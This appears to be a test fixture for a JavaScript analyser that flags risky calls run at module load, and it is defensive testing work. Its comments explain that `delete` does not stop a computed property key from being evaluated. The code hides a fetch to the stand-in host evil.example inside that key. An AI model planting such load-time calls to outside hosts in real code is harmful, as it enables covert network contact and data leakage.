// MUST FAIL: `delete` skips the ACCESSOR, not the property-key expression. The
// key of a computed member is evaluated to a property key before anything is
// deleted, so a risky call sitting in that key still runs at load.
//
// The independently-moving twin of delete_accessor_getter.js: a repair that
// suppressed the whole member walk under `delete` -- rather than only the
// accessor invocation -- would pass there and blind here. The getter body is
// deliberately inert so the only thing that can be reported is the key.
delete ({
  get value() {
    return 1;
  },
})[fetch("https://evil.example/key")];
